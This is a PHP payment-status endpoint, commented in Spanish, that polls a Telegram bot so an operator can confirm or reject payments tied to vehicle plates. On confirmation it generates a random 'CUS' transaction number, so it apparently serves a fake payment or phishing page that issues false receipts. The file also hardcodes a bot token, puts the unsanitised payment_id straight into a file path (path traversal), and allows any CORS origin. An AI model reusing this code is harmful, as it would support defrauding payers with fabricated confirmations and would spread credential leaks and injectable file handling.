<?php
// ═══════════════════════════════════════════
//  CREDENCIALES — solo viven en este archivo
// ═══════════════════════════════════════════
$BOT_TOKEN = '8641560926:AAFoOqOUQ_2oqG98-R-R3DCMKHqBwF8R4NU';


// ═══════════════════════════════════════════
//  CORS
// ═══════════════════════════════════════════
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json; charset=UTF-8");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit(); }

// ═══════════════════════════════════════════
//  Leer payment_id del query string
// ═══════════════════════════════════════════
$paymentId = trim($_GET['payment_id'] ?? '');
if (!$paymentId) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'payment_id requerido']);
    exit();
}

$payDir  = sys_get_temp_dir() . '/pyp_payments';
$payFile = $payDir . '/' . $paymentId . '.json';

if (!file_exists($payFile)) {
    http_response_code(404);
    echo json_encode(['status' => 'error', 'message' => 'Pago no encontrado']);
    exit();
}

$payData = json_decode(file_get_contents($payFile), true);

// ── Si ya tiene respuesta, devolverla directo ──────────────────
if ($payData['status'] !== 'pending') {
    echo json_encode([
        'status' => $payData['status'],
        'cus'    => $payData['cus'] ?? null,
    ]);
    exit();
}

// ═══════════════════════════════════════════
//  Obtener offset guardado
// ═══════════════════════════════════════════
$offsetFile = $payDir . '/offset.txt';
$offset     = file_exists($offsetFile) ? (int)file_get_contents($offsetFile) : 0;

// ═══════════════════════════════════════════
//  Llamar getUpdates de Telegram
// ═══════════════════════════════════════════
$url = "https://api.telegram.org/bot{$BOT_TOKEN}/getUpdates"
     . "?offset={$offset}&timeout=0&allowed_updates=callback_query";

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_HTTPGET        => true,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 8,
    CURLOPT_SSL_VERIFYPEER => true,
]);
$resp    = curl_exec($ch);
$curlErr = curl_error($ch);
curl_close($ch);

if ($curlErr) {
    echo json_encode(['status' => 'pending']);
    exit();
}

$updates = json_decode($resp, true);

if (!$updates['ok'] || empty($updates['result'])) {
    echo json_encode(['status' => 'pending']);
    exit();
}

// ═══════════════════════════════════════════
//  Procesar cada update
// ═══════════════════════════════════════════
$maxOffset = $offset;

foreach ($updates['result'] as $update) {
    $updateId  = $update['update_id'];
    if ($updateId >= $maxOffset) $maxOffset = $updateId + 1;

    if (!isset($update['callback_query'])) continue;

    $cq       = $update['callback_query'];
    $cbData   = $cq['data'] ?? '';
    $cbQueryId = $cq['id'];

    // ── Confirmar pago ──
    if ($cbData === 'confirm_' . $paymentId) {
        $cus = rand(100000000, 999999999);
        $payData['status'] = 'confirmed';
        $payData['cus']    = (string)$cus;
        file_put_contents($payFile, json_encode($payData, JSON_UNESCAPED_UNICODE));
        file_put_contents($offsetFile, $maxOffset);
        answerCallback($BOT_TOKEN, $cbQueryId, '✅ Pago confirmado exitosamente');
        editMessage($BOT_TOKEN, $cq['message']['chat']['id'], $cq['message']['message_id'],
            "✅ *Pago confirmado*\n🚘 Placa: `{$payData['placa']}`\n💰 Monto: \${$payData['monto']}\nCUS: `{$cus}`");
        echo json_encode(['status' => 'confirmed', 'cus' => (string)$cus]);
        exit();
    }

    // ── Rechazar pago ──
    if ($cbData === 'reject_' . $paymentId) {
        $payData['status'] = 'rejected';
        file_put_contents($payFile, json_encode($payData, JSON_UNESCAPED_UNICODE));
        file_put_contents($offsetFile, $maxOffset);
        answerCallback($BOT_TOKEN, $cbQueryId, '❌ Pago rechazado');
        editMessage($BOT_TOKEN, $cq['message']['chat']['id'], $cq['message']['message_id'],
            "❌ *Pago rechazado*\n🚘 Placa: `{$payData['placa']}`");
        echo json_encode(['status' => 'rejected']);
        exit();
    }
}

// Actualizar offset aunque no haya match en este payment_id
file_put_contents($offsetFile, $maxOffset);
echo json_encode(['status' => 'pending']);

// ═══════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════
function answerCallback($token, $callbackId, $text) {
    $ch = curl_init("https://api.telegram.org/bot{$token}/answerCallbackQuery");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode(['callback_query_id' => $callbackId, 'text' => $text]),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 5,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function editMessage($token, $chatId, $msgId, $newText) {
    $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode([
            'chat_id'    => $chatId,
            'message_id' => $msgId,
            'text'       => $newText,
            'parse_mode' => 'Markdown',
        ]),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 5,
    ]);
    curl_exec($ch);
    curl_close($ch);
}